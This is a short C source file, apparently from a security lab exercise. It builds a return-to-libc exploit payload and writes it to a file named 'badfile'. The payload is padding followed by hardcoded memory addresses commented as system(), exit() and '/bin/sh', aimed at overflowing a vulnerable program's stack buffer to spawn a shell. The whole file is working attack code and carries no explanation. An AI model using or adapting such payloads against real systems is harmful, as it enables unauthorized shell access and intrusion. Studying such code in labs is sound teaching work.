#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
char buf[31];
FILE *badfile;
badfile = fopen("./badfile", "w");

strcpy(buf,"AAAAAAAAAAAAAAAAAAA");    // 19
*(long *) &buf[27] = 0xbffffe0e ;   //  "/bin/sh"
*(long *) &buf[19] = 0xb7da4da0 ;   //  system()
*(long *) &buf[23] = 0xb7d989d0 ;   //  exit()
fwrite(buf, sizeof(buf), 1, badfile);
fclose(badfile);
}


